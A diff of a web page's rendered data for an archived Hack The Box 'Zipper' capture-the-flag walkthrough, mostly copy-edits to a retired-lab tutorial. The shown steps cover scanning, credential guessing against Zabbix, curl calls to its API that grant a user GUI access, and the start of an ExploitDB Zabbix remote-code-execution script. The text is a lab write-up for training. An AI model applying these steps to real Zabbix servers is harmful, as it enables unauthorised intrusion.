@@ -4,24 +4,23 @@
 14:I[484,[],"OutletBoundary"]
 15:"$Sreact.suspense"
 :HL["/writing/covers/hackthebox-zipper-walkthrough.webp","image"]
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Zipper Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Zipper machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-09T10:52:39.000Z","children":"9 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[12," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-zipper-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Zipper machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Zipper machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/zipper","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","the-hacker-mindset",{"children":["$","a",null,{"href":"#the-hacker-mindset","children":"The Hacker Mindset"}]}],["$","li","phase-1-reconnaissance",{"children":["$","a",null,{"href":"#phase-1-reconnaissance","children":"Phase 1 — Reconnaissance"}]}],["$","li","phase-2-web-enumeration",{"children":["$","a",null,{"href":"#phase-2-web-enumeration","children":"Phase 2 — Web Enumeration"}]}],["$","li","phase-3-gaining-access-to-zabbix",{"children":["$","a",null,{"href":"#phase-3-gaining-access-to-zabbix","children":"Phase 3 — Gaining Access to Zabbix"}]}],["$","li","phase-4-remote-code-execution",{"children":["$","a",null,{"href":"#phase-4-remote-code-execution","children":"Phase 4 — Remote Code Execution"}]}],["$","li","phase-5-lateral-movement-to-zapper",{"children":"$L4"}],"$L5","$L6"]}]]}],"$L7"],"$L8","$L9",["$La","$Lb","$Lc"]]}],"$Ld"]}]]}],"$Le"]}],"$Lf","$L10"],null,"$L11"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"zs2c_HJI2CXWwLDIPVraL"}
-4:["$","a",null,{"href":"#phase-5-lateral-movement-to-zapper","children":"Phase 5 — Lateral Movement to Zapper"}]
-5:["$","li","phase-6-privilege-escalation-to-root",{"children":["$","a",null,{"href":"#phase-6-privilege-escalation-to-root","children":"Phase 6 — Privilege Escalation to Root"}]}]
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Zipper Walkthrough"}],["$","p",null,{"className":"article-dek","children":"Guest Zabbix data revealed the Zapper account, whose matching username and password authenticated to the API; restored GUI access and agent-side script execution produced a service shell, then a backup-script password and PATH hijack in a setuid utility reached root."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-09T10:52:39.000Z","children":"9 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[11," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-zipper-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Zipper machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Zipper machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/zipper","target":"_blank","rel":"nofollow noopener noreferrer","children":"Hack The Box machine artwork"}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","phase-1-reconnaissance",{"children":["$","a",null,{"href":"#phase-1-reconnaissance","children":"Phase 1: Reconnaissance"}]}],["$","li","phase-2-web-enumeration",{"children":["$","a",null,{"href":"#phase-2-web-enumeration","children":"Phase 2: Web Enumeration"}]}],["$","li","phase-3-gaining-access-to-zabbix",{"children":["$","a",null,{"href":"#phase-3-gaining-access-to-zabbix","children":"Phase 3: Gaining Access to Zabbix"}]}],["$","li","phase-4-remote-code-execution",{"children":["$","a",null,{"href":"#phase-4-remote-code-execution","children":"Phase 4: Remote Code Execution"}]}],["$","li","phase-5-lateral-movement-to-zapper",{"children":"$L4"}],"$L5","$L6"]}]]}],"$L7"],"$L8","$L9",["$La","$Lb","$Lc"]]}],"$Ld"]}]]}],"$Le"]}],"$Lf","$L10"],null,"$L11"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"EBRi0HxexS1XMGpfUl_9d"}
+4:["$","a",null,{"href":"#phase-5-lateral-movement-to-zapper","children":"Phase 5: Lateral Movement to Zapper"}]
+5:["$","li","phase-6-privilege-escalation-to-root",{"children":["$","a",null,{"href":"#phase-6-privilege-escalation-to-root","children":"Phase 6: Privilege Escalation to Root"}]}]
 6:["$","li","lessons-learned",{"children":["$","a",null,{"href":"#lessons-learned","children":"Lessons Learned"}]}]
-7:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page · ",8," sections"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","the-hacker-mindset",{"children":["$","a",null,{"href":"#the-hacker-mindset","children":"The Hacker Mindset"}]}],["$","li","phase-1-reconnaissance",{"children":["$","a",null,{"href":"#phase-1-reconnaissance","children":"Phase 1 — Reconnaissance"}]}],["$","li","phase-2-web-enumeration",{"children":["$","a",null,{"href":"#phase-2-web-enumeration","children":"Phase 2 — Web Enumeration"}]}],["$","li","phase-3-gaining-access-to-zabbix",{"children":["$","a",null,{"href":"#phase-3-gaining-access-to-zabbix","children":"Phase 3 — Gaining Access to Zabbix"}]}],["$","li","phase-4-remote-code-execution",{"children":["$","a",null,{"href":"#phase-4-remote-code-execution","children":"Phase 4 — Remote Code Execution"}]}],["$","li","phase-5-lateral-movement-to-zapper",{"children":["$","a",null,{"href":"#phase-5-lateral-movement-to-zapper","children":"Phase 5 — Lateral Movement to Zapper"}]}],["$","li","phase-6-privilege-escalation-to-root",{"children":["$","a",null,{"href":"#phase-6-privilege-escalation-to-root","children":"Phase 6 — Privilege Escalation to Root"}]}],["$","li","lessons-learned",{"children":["$","a",null,{"href":"#lessons-learned","children":"Lessons Learned"}]}]]}]}]]}]
-8:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","9 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/5505707ade662db4eccb34bcdf7be9cb2e44854f/HTB-Zipper.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · 5505707ade66",""]}]]]}]
-9:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Zipper"," · Linux"," · Medium"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/zipper","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]
+7:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page (",7," sections)"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","phase-1-reconnaissance",{"children":["$","a",null,{"href":"#phase-1-reconnaissance","children":"Phase 1: Reconnaissance"}]}],["$","li","phase-2-web-enumeration",{"children":["$","a",null,{"href":"#phase-2-web-enumeration","children":"Phase 2: Web Enumeration"}]}],["$","li","phase-3-gaining-access-to-zabbix",{"children":["$","a",null,{"href":"#phase-3-gaining-access-to-zabbix","children":"Phase 3: Gaining Access to Zabbix"}]}],["$","li","phase-4-remote-code-execution",{"children":["$","a",null,{"href":"#phase-4-remote-code-execution","children":"Phase 4: Remote Code Execution"}]}],["$","li","phase-5-lateral-movement-to-zapper",{"children":["$","a",null,{"href":"#phase-5-lateral-movement-to-zapper","children":"Phase 5: Lateral Movement to Zapper"}]}],["$","li","phase-6-privilege-escalation-to-root",{"children":["$","a",null,{"href":"#phase-6-privilege-escalation-to-root","children":"Phase 6: Privilege Escalation to Root"}]}],["$","li","lessons-learned",{"children":["$","a",null,{"href":"#lessons-learned","children":"Lessons Learned"}]}]]}]}]]}]
+8:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes on ","9 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/5505707ade662db4eccb34bcdf7be9cb2e44854f/HTB-Zipper.md","target":"_blank","rel":"nofollow noopener noreferrer","children":"Immutable source revision"}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 5505707ade66",""]}]]]}]
+9:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Zipper, Linux, Medium",". Retired status verified ","12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/zipper","target":"_blank","rel":"nofollow noopener noreferrer","children":"Open Hack The Box profile"}]]}]
 a:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Zipper machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
-b:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-c:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"20 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-12:T5a6f,
-<p><strong>Machine IP:</strong> 10.129.1.198<br /><strong>Attacker IP:</strong> 10.10.16.84<br /><strong>Difficulty:</strong> Medium<br /><strong>OS:</strong> Linux (Ubuntu)<br /><strong>Flags:</strong> User + Root  </p>
-<hr />
+b:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported from Abdullah Kareem's public preparation notes and lightly copy-edited for clarity. Commands and technical claims remain tied to the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+c:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"12 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+12:T581c,<p><strong>Machine IP:</strong> 10.129.1.198<br><strong>Attacker IP:</strong> 10.10.16.84<br><strong>Difficulty:</strong> Medium<br><strong>OS:</strong> Linux (Ubuntu)<br><strong>Flags:</strong> User + Root  </p>
+<hr>
 
 
 
-<h2 id="the-hacker-mindset">The Hacker Mindset</h2>
-<p>Before diving in, understand the core loop every penetration tester follows:</p>
+
+<p>Start with the core loop every penetration tester follows:</p>
 <pre><code>Enumerate → Identify → Exploit → Pivot → Repeat
 </code></pre>
 <p>At every step, ask yourself:</p>
@@ -32,18 +31,18 @@ c:["$","div","editorial-correction-2",{"className":"article-review-note article-
 <li><strong>What privileges does this process run as?</strong></li>
 <li><strong>Can I abuse this to move somewhere I shouldn't be?</strong></li>
 </ul>
-<p>Never skip enumeration. The more you know about the target, the fewer rabbit holes you fall into.</p>
-<hr />
-<h2 id="phase-1-reconnaissance">Phase 1 — Reconnaissance</h2>
+<p>Enumerate again after every access change; each new context exposes different services, files, and privileges.</p>
+<hr>
+<h2 id="phase-1-reconnaissance">Phase 1: Reconnaissance</h2>
 <h3 id="step-1-port-scanning-with-nmap">Step 1: Port Scanning with Nmap</h3>
-<p>The very first thing we do against any target is find out what services are exposed. We use <strong>nmap</strong> — a network scanner that sends probes to ports and interprets responses to identify open services.</p>
+<p>The very first thing we do against any target is find out what services are exposed. We use <strong>nmap</strong> - a network scanner that sends probes to ports and interprets responses to identify open services.</p>
 <pre><code class="language-bash" data-language="bash">nmap -sV -sT -sC 10.129.1.198
 </code></pre>
 <p><strong>Flag breakdown:</strong></p>
 <ul>
-<li><code>-sV</code> — Probe open ports to determine service and version</li>
-<li><code>-sT</code> — TCP connect scan (more reliable than SYN scan without root)</li>
-<li><code>-sC</code> — Run default NSE scripts (grabs banners, checks common vulns)</li>
+<li><code>-sV</code> : Probe open ports to determine service and version</li>
+<li><code>-sT</code> : TCP connect scan (more reliable than SYN scan without root)</li>
+<li><code>-sC</code> : Run default NSE scripts (grabs banners, checks common vulns)</li>
 </ul>
 <p><strong>Output:</strong></p>
 <pre><code>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4
@@ -51,80 +50,80 @@ c:["$","div","editorial-correction-2",{"className":"article-review-note article-
 </code></pre>
 <p><strong>What this tells us:</strong></p>
 <ul>
-<li>Port 22 (SSH) is open — potential entry point if we find credentials</li>
-<li>Port 80 (HTTP) is open — a web application to explore</li>
-<li>It's Ubuntu Linux — good to know for exploit compatibility</li>
+<li>Port 22 (SSH) is open - potential entry point if we find credentials</li>
+<li>Port 80 (HTTP) is open - a web application to explore</li>
+<li>It's Ubuntu Linux - good to know for exploit compatibility</li>
 </ul>
-<p><strong>Hacker mindset:</strong> Two ports means a small attack surface. SSH usually requires credentials we don't have yet, so HTTP is the obvious starting point. The Apache version (2.4.29) is old — worth noting for potential vulnerabilities later.</p>
-<hr />
-<h2 id="phase-2-web-enumeration">Phase 2 — Web Enumeration</h2>
+<p> Two ports means a small attack surface. SSH usually requires credentials we don't have yet, so HTTP is the obvious starting point. The Apache version (2.4.29) is old - worth noting for potential vulnerabilities later.</p>
+<hr>
+<h2 id="phase-2-web-enumeration">Phase 2: Web Enumeration</h2>
 <h3 id="step-2-browse-to-port-80">Step 2: Browse to Port 80</h3>
 <p>Open a browser and visit <code>http://10.129.1.198</code>. You'll see the <strong>default Apache2 "It works!" page</strong>. This tells us:</p>
 <ul>
 <li>Apache is installed but no custom web app is served at the root</li>
 <li>There are likely subdirectories hosting the real application</li>
-<li>The admin left the default page — potentially an oversight</li>
+<li>The admin left the default page - potentially an oversight</li>
 </ul>
-<p><strong>Hacker mindset:</strong> A default Apache page is actually a clue, not a dead end. It means there's almost certainly something hidden in a subdirectory. Time to brute-force directories.</p>
-<hr />
+<p> A default Apache page is actually a clue, not a dead end. It means there's almost certainly something hidden in a subdirectory. Time to brute-force directories.</p>
+<hr>
 <h3 id="step-3-directory-brute-forcing-with-gobuster">Step 3: Directory Brute Forcing with Gobuster</h3>
 <p>We use <strong>gobuster</strong> to discover hidden paths by trying thousands of common directory names:</p>
 <pre><code class="language-bash" data-language="bash">gobuster dir -u http://10.129.1.198/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 </code></pre>
 <p><strong>Flag breakdown:</strong></p>
 <ul>
-<li><code>dir</code> — Directory enumeration mode</li>
-<li><code>-u</code> — Target URL</li>
-<li><code>-w</code> — Wordlist to use (medium = ~220,000 entries)</li>
+<li><code>dir</code> : Directory enumeration mode</li>
+<li><code>-u</code> : Target URL</li>
+<li><code>-w</code> : Wordlist to use (medium = ~220,000 entries)</li>
 </ul>
 <p><strong>Output:</strong></p>
 <pre><code>/zabbix  (Status: 301)
 </code></pre>
-<p><strong>What this tells us:</strong> There's a <code>/zabbix</code> directory — Zabbix is an open-source IT monitoring platform. Finding it changes our entire attack direction.</p>
-<p><strong>Hacker mindset:</strong> Monitoring platforms are goldmines. They have:</p>
+<p><strong>What this tells us:</strong> There's a <code>/zabbix</code> directory - Zabbix is an open-source IT monitoring platform. Finding it changes our entire attack direction.</p>
+<p> Monitoring platforms are useful sources. They have:</p>
 <ul>
 <li>Agent software installed on hosts (which can execute commands)</li>
 <li>Credentials stored in configuration</li>
 <li>APIs that can be abused</li>
 <li>Often misconfigured access controls</li>
 </ul>
-<hr />
-<h2 id="phase-3-gaining-access-to-zabbix">Phase 3 — Gaining Access to Zabbix</h2>
+<hr>
+<h2 id="phase-3-gaining-access-to-zabbix">Phase 3: Gaining Access to Zabbix</h2>
 <h3 id="step-4-explore-the-zabbix-login-page">Step 4: Explore the Zabbix Login Page</h3>
 <p>Visit <code>http://10.129.1.198/zabbix</code>. You'll see a login page for <strong>Zabbix 3.0.21</strong>.</p>
 <p>Notice the <strong>"Sign in as guest"</strong> option. Click it.</p>
-<p><strong>Why guest access matters:</strong> Guest accounts in monitoring systems often have read-only access to dashboards. Even read-only data can reveal hostnames, usernames, running scripts, and infrastructure details — all useful intelligence.</p>
-<hr />
+<p><strong>Why guest access matters:</strong> Guest accounts in monitoring systems often have read-only access to dashboards. Even read-only data can reveal hostnames, usernames, running scripts, and infrastructure details - all useful intelligence.</p>
+<hr>
 <h3 id="step-5-enumerate-as-guest">Step 5: Enumerate as Guest</h3>
 <p>After logging in as guest, navigate to <strong>Monitoring → Latest data</strong>.</p>
 <p>You'll see:</p>
 <pre><code>Zapper's Backup Script    Last value: 0
 </code></pre>
 <p><strong>What this tells us:</strong> There's a user named <strong>zapper</strong> on this system, and they have a backup script registered in Zabbix.</p>
-<p><strong>Hacker mindset:</strong> Usernames are half of a credential pair. When you find a username in one place, immediately try it everywhere — especially as a password. People reuse usernames as passwords more often than you'd think.</p>
-<hr />
+<p> Usernames are half of a credential pair. When you find a username in one place, immediately try it everywhere - especially as a password. People reuse usernames as passwords more often than you'd think.</p>
+<hr>
 <h3 id="step-6-try-logging-in-as-zapper">Step 6: Try Logging in as Zapper</h3>
 <p>Go back to the Zabbix login page and try:</p>
 <ul>
 <li><strong>Username:</strong> <code>zapper</code></li>
-<li><strong>Password:</strong> REDACTED</li>
+<li><strong>Password:</strong> <code>REDACTED</code></li>
 </ul>
 <p><strong>Result:</strong> <code>GUI access disabled</code></p>
 <p>This means the credentials work (Zabbix accepted them) but zapper's user group doesn't allow GUI login. This is a configuration restriction, not a wrong password.</p>
-<p><strong>Hacker mindset:</strong> "GUI access disabled" is actually good news — it confirms the credentials are valid. Now we just need to change zapper's group permissions. Since Zabbix has an API, we can do this programmatically without needing GUI access.</p>
-<hr />
+<p> "GUI access disabled" is actually good news - it confirms the credentials are valid. Now we just need to change zapper's group permissions. Since Zabbix has an API, we can do this programmatically without needing GUI access.</p>
+<hr>
 <h3 id="step-7-authenticate-via-the-zabbix-api">Step 7: Authenticate via the Zabbix API</h3>
 <p>Zabbix exposes a JSON-RPC API at <code>/zabbix/api_jsonrpc.php</code>. We can authenticate and perform administrative actions through it even without GUI access.</p>
 <pre><code class="language-bash" data-language="bash">curl -s -X POST http://10.129.1.198/zabbix/api_jsonrpc.php \
   -H "Content-Type: application/json" \
-  -d '{"jsonrpc":"2.0","method":"user.login","params":{"user":"zapper","password":null},"id":1}'
+  -d '{"jsonrpc":"2.0","method":"user.login","params":{"user":"zapper","password":"REDACTED"},"id":1}'
 </code></pre>
 <p><strong>Response:</strong></p>
-<pre><code class="language-json" data-language="json">{"jsonrpc":"2.0","result":"[redacted retired-lab hash or flag]","id":1}
+<pre><code class="language-json" data-language="json">{"jsonrpc":"2.0","result":"REDACTED_HASH_OR_FLAG","id":1}
 </code></pre>
-<p>The <code>result</code> value is our <strong>auth token</strong> — a session key we include in all future API calls to prove we're authenticated.</p>
-<p><strong>Hacker mindset:</strong> APIs often have weaker access controls than the GUI. A GUI might show a button as greyed out or hidden, but the API endpoint behind it is still callable. Always look for APIs when the GUI blocks you.</p>
-<hr />
+<p>The <code>result</code> value is our <strong>auth token</strong> - a session key we include in all future API calls to prove we're authenticated.</p>
+<p> APIs often have weaker access controls than the GUI. A GUI might show a button as greyed out or hidden, but the API endpoint behind it is still callable. Always look for APIs when the GUI blocks you.</p>
+<hr>
 <h3 id="step-8-create-a-new-user-group-with-gui-access">Step 8: Create a New User Group with GUI Access</h3>
 <p>Now we create a new Zabbix user group that allows GUI access:</p>
 <pre><code class="language-bash" data-language="bash">curl -s -X POST http://10.129.1.198/zabbix/api_jsonrpc.php \
@@ -133,21 +132,21 @@ c:["$","div","editorial-correction-2",{"className":"article-review-note article-
     "jsonrpc":"2.0",
     "method":"usergroup.create",
     "params":{"name":"guiaccess","gui_access":0,"users_status":0},
-    "auth":null,
+    "auth":"REDACTED",
     "id":2
   }'
 </code></pre>
 <p><strong>Parameters explained:</strong></p>
 <ul>
-<li><code>gui_access: 0</code> — System default (allows GUI login)</li>
-<li><code>users_status: 0</code> — Users are enabled (not disabled)</li>
+<li><code>gui_access: 0</code> : System default (allows GUI login)</li>
+<li><code>users_status: 0</code> : Users are enabled (not disabled)</li>
 </ul>
 <p><strong>Response:</strong></p>
 <pre><code class="language-json" data-language="json">{"result":{"usrgrpids":["13"]}}
 </code></pre>
 <p>New group created with ID <code>13</code>.</p>
-<p><strong>Hacker mindset:</strong> We're not breaking in — we're using a legitimate API with legitimate credentials to change a configuration. This is the line between exploitation and authorized use. On a pentest, this is valid. The vulnerability is that zapper had API access despite being locked out of the GUI.</p>
-<hr />
+<p> We're not breaking in - we're using a legitimate API with legitimate credentials to change a configuration. This is the line between exploitation and authorized use. On a pentest, this is valid. The vulnerability is that zapper had API access despite being locked out of the GUI.</p>
+<hr>
 <h3 id="step-9-get-zapper-s-user-id">Step 9: Get Zapper's User ID</h3>
 <pre><code class="language-bash" data-language="bash">curl -s -X POST http://10.129.1.198/zabbix/api_jsonrpc.php \
   -H "Content-Type: application/json" \
@@ -155,13 +154,13 @@ c:["$","div","editorial-correction-2",{"className":"article-review-note article-
     "jsonrpc":"2.0",
     "method":"user.get",
     "params":{"output":"extend","filter":{"alias":"zapper"}},
-    "auth":null,
+    "auth":"REDACTED",
     "id":3
   }'
 </code></pre>
 <p><strong>Response:</strong> <code>userid: 3</code></p>
 <p>We need the user ID to modify the user's group membership via the API.</p>
-<hr />
+<hr>
 <h3 id="step-10-add-zapper-to-the-new-group">Step 10: Add Zapper to the New Group</h3>
 <pre><code class="language-bash" data-language="bash">curl -s -X POST http://10.129.1.198/zabbix/api_jsonrpc.php \
   -H "Content-Type: application/json" \
@@ -169,21 +168,21 @@ c:["$","div","editorial-correction-2",{"className":"article-review-note article-
     "jsonrpc":"2.0",
     "method":"user.update",
     "params":{"userid":"3","usrgrps":[{"usrgrpid":"13"}]},
-    "auth":null,
+    "auth":"REDACTED",
     "id":4
   }'
 </code></pre>
 <p>This removes zapper from the "No access to frontend" group and places them in our new GUI-enabled group.</p>
-<hr />
+<hr>
 <h3 id="step-11-login-to-zabbix-gui-as-zapper">Step 11: Login to Zabbix GUI as Zapper</h3>
 <p>Go back to <code>http://10.129.1.198/zabbix</code> and login with <code>zapper:zapper</code>.</p>
 <p>You now have full dashboard access.</p>
 <p>Navigate to <strong>Configuration → Hosts</strong> and click on <strong>"Zipper"</strong>. The URL will show:</p>
 <pre><code>hostid=10106
 </code></pre>
-<p>Note this down — we need it for the exploit.</p>
-<hr />
-<h2 id="phase-4-remote-code-execution">Phase 4 — Remote Code Execution</h2>
+<p>Note this down - we need it for the exploit.</p>
+<hr>
+<h2 id="phase-4-remote-code-execution">Phase 4: Remote Code Execution</h2>
 <h3 id="step-12-understanding-the-zabbix-rce-vulnerability">Step 12: Understanding the Zabbix RCE Vulnerability</h3>
 <p>Zabbix allows administrators to create <strong>scripts</strong> that execute on monitored hosts via the Zabbix agent. The agent runs on the target machine and executes commands sent from the Zabbix server.</p>
 <p>The exploit (CVE-N/A, ExploitDB #39937) abuses this by:</p>
@@ -193,11 +192,11 @@ c:["$","div","editorial-correction-2",{"className":"article-review-note article-
 </ol>
 <p>The critical setting is <code>execute_on</code>:</p>
 <ul>
-<li><code>1</code> = Execute on the <strong>Zabbix server</strong> (a Docker container in this case — a rabbit hole)</li>
+<li><code>1</code> = Execute on the <strong>Zabbix server</strong> (a Docker container in this case - a rabbit hole)</li>
 <li><code>0</code> = Execute on the <strong>Zabbix agent</strong> (the actual target machine)</li>
 </ul>
-<p><strong>Hacker mindset:</strong> Always read the code of an exploit before running it. The original exploit used <code>execute_on: 1</code> (server), which would give you a shell inside a Docker container — not the host. Understanding what the exploit actually does prevents wasted time.</p>
-<hr />
+<p> Always read the code of an exploit before running it. The original exploit used <code>execute_on: 1</code> (server), which would give you a shell inside a Docker container - not the host. Understanding what the exploit actually does prevents wasted time.</p>
+<hr>
 <h3 id="step-13-download-and-modify-the-exploit">Step 13: Download and Modify the Exploit</h3>
 <pre><code class="language-bash" data-language="bash">searchsploit -m 39937
 </code></pre>
@@ -217,13 +216,13 @@ import requests, json, readline
 ZABIX_ROOT = 'http://10.129.1.198/zabbix'
 url = ZABIX_ROOT + '/api_jsonrpc.php'
 login = 'zapper'
-password = REDACTED
+password = 'REDACTED'
 hostid = '10106'
 
 payload = {"jsonrpc":"2.0","method":"user.login",
-           "params":{'user':login,'password':null,"auth":null,"id":0}
